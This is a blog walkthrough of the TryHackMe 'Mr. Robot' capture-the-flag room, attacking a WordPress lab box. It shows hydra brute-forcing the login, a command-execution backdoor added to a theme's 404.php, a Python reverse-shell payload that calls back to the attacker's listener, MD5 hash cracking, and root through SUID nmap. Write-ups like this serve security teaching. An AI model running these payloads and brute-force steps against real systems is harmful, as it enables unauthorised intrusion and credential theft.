---
layout: page
title: Mr. Robot
description: Mr. Robot from TryHackMe.
img: 
importance: 3
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/mrrobot/logo.png" title="THM Mr. Robot Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://tryhackme.com/room/mrrobot">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we go taking on Mr. Robot.  Hope you enjoy the ride.

The nmaps didn't seem to work on this one.  So, we will skip it and get on with exploritizing.  Run curl -I to get the headers to try and fingerprint the technology.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ curl -I http://10.10.11.55 
HTTP/1.1 200 OK
Date: Sun, 09 Feb 2025 03:35:38 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Accept-Ranges: bytes
Vary: Accept-Encoding
X-Mod-Pagespeed: 1.9.32.3-4523
Cache-Control: max-age=0, no-cache
Content-Length: 1188
Content-Type: text/html
```
{% endraw %}

<br />
And curl -I against port 443 just to ensure that it is the same.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ curl -I https://10.10.11.55 -k
HTTP/1.1 200 OK
Date: Sun, 09 Feb 2025 03:36:10 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Accept-Ranges: bytes
Vary: Accept-Encoding
X-Mod-Pagespeed: 1.9.32.3-4523
Cache-Control: max-age=0, no-cache
Content-Length: 1077
Content-Type: text/html
```
{% endraw %}

<br />
Run ffuf against the port 80 website to try to find any interesting directories or files.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.55/FUZZ -e .txt,.bak,.html,.php -fw 189

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.55/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 189
________________________________________________

.html                   [Status: 403, Size: 214, Words: 16, Lines: 10, Duration: 275ms]
images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 275ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 370ms]
blog                    [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 299ms]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 691ms]
sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 304ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 678ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 721ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 673ms]
video                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 265ms]
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 728ms]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 666ms]
wp-content              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 260ms]
admin                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 263ms]
audio                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 267ms]
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 263ms]
wp-login                [Status: 200, Size: 2657, Words: 115, Lines: 53, Duration: 666ms]
wp-login.php            [Status: 200, Size: 2657, Words: 115, Lines: 53, Duration: 654ms]
css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 262ms]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 636ms]
license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 264ms]
license.txt             [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 265ms]
wp-includes             [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 378ms]
js                      [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 308ms]
wp-register.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3192ms]
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3041ms]
wp-rss2.php             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2958ms]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2883ms]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3056ms]
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 389ms]
readme.html             [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 316ms]
robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 316ms]
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 318ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2879ms]
%20                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3280ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```
{% endraw %}

<br />
Check the wp-login.php page to give it a look.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/wp-login.png" title="Check the Login Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run wpscan to enumerate the users.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ wpscan --url http://10.10.11.55 --enumerate u  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.11.55/ [10.10.11.55]
[+] Started: Sun Feb  9 14:42:48 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.11.55/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.55/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.11.55/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.11.55/a386c7c.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.11.55/a386c7c.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.11.55/wp-content/themes/twentyfifteen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://10.10.11.55/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://10.10.11.55/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.55/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:05 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:05

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Feb  9 14:44:38 2025
[+] Requests Done: 62
[+] Cached Requests: 6
[+] Data Sent: 15.066 KB
[+] Data Received: 279.021 KB
[+] Memory used: 240.48 MB
[+] Elapsed time: 00:01:50
```
{% endraw %}

<br />
Check the robots.txt file.

{% raw %}
```sh
User-agent: *
fsocity.dic
key-1-of-3.txt
```
{% endraw %}

<br />
Download the two files that are indicated in the file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ curl http://10.10.11.55/key-1-of-3.txt -o key-1-of-3.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0     34      0 --:--:-- --:--:-- --:--:--    34

┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ curl http://10.10.11.55/fsocity.dic -o fsocity.dic
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0   557k      0  0:00:12  0:00:12 --:--:-- 1255k
```
{% endraw %}

<br />
Get the first flag.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ curl http://10.10.11.55/key-1-of-3.txt         
<redacted>
```
{% endraw %}

<br />
Get the login request in the Network tab of the devloper's tools.  We can note the data parameters that we can send.  We can also not the phrase to check to determine if we have a valid username.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/loginrequest.png" title="Check the Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the hydra program and the fsociety.dic dictionary to try and brute-force the username.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ hydra -L fsocity.dic -p admin 10.10.11.55 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:Invalid Username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 14:59:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.11.55:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:Invalid Username
[80][http-post-form] host: 10.10.11.55   login: Elliot   password: admin
[STATUS] 112.00 tries/min, 112 tries in 00:01h, 858123 to do in 127:42h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
{% endraw %}

<br />
View the request with the valid username to get an updated failure phrase.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/invalidpw.png" title="Invalid Password" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run hydra again to search for the password so we can have a valid login set.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ hydra -l Elliot -P fsocity.dic 10.10.145.112 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:The password you entered"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task
[DATA] attacking http-post-form://10.10.145.112:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:The password you entered
[80][http-post-form] host: 10.10.145.112   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:20
```
{% endraw %}

<br />
Test the credentials and login into the wordpress instance.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/testcred.png" title="Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Go to the theme editor.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/themeed.png" title="Theme Editor" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Edit the 404.php file and a command line to accept a get parameter and execute it.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/404.png" title="Edit the 404.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to the 404.php file and give it ls to test the command execution.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/lstest.png" title="Test ls" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a listener that listens on port 4444.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
```
{% endraw %}

<br />
Use revshells to get a python one-liner exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Inject the Revshells payload into the cmd parameter.  Restart the victim machine if you ever run out of time.

{% raw %}
```sh
http://10.10.145.112/wp-content/themes/twentyfifteen/404.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.4.119.29%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.145.112] 60036
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
python3 -c 'import pty; pty.spawn("/bin/bash");'
</wordpress/htdocs/wp-content/themes/twentyfifteen$
```
{% endraw %}

<br />
Check the password.raw-md5 file to get the password hash.

{% raw %}
```sh
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
{% endraw %}

<br />
Use john the ripper to crack the password hash.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/thm/mrrobot]
└─$ john --wordlist=/home/kali/Documents/htb/metatwo/hashkiller24.txt --format=raw-md5 password.raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)     
1g 0:00:00:05 DONE (2025-02-09 16:00) 0.1721g/s 11515Kp/s 11515Kc/s 11515KC/s abcdefghijklmnop123secret..ABCDEFGHILMNOPQRSTUVZ
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Use the new password to switch user into the robot user.

{% raw %}
```sh
</wordpress/htdocs/wp-content/themes/twentyfifteen$ su robot 
su robot
Password: abcdefghijklmnopqrstuvwxyz
```
{% endraw %}

<br />
Snag that second flag.  See that.  It rhymed.

{% raw %}
```sh
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
<redacted>
robot@linux:~$ ip a 
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:56:d1:80:13:d1 brd ff:ff:ff:ff:ff:ff
    inet 10.10.45.171/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::56:d1ff:fe80:13d1/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Try sudo -l to see what we can run as sudo.  Nothing.

{% raw %}
```sh
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```
{% endraw %}

<br />
Check the g0tmi1k Linux privilege escalation blog.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/gotmilk.png" title="G0tmi1k" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>

<br />
Run the command to get a list of the SUID stick bit programs.  Hey, nmap!  Easy.

{% raw %}
```sh
robot@linux:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
{% endraw %}

<br />
I have done this in the past but we will check the GTFOBins just to double-check.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/mrrobot/gtfobins.png" title="GTFOBins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a>

<br />
Enter into nmap interactive mode and drop into a shell.

{% raw %}
```sh
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh 
!sh
# whoami
whoami
root
```
{% endraw %}

<br />
Get the last flag.

{% raw %}
```sh
# cat key-3-of-3.txt
cat key-3-of-3.txt
<redacted>
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:f7:48:be:30:fd brd ff:ff:ff:ff:ff:ff
    inet 10.10.145.112/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::f7:48ff:febe:30fd/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Domo Arigato Mr. Roboto!  Thanks for the box!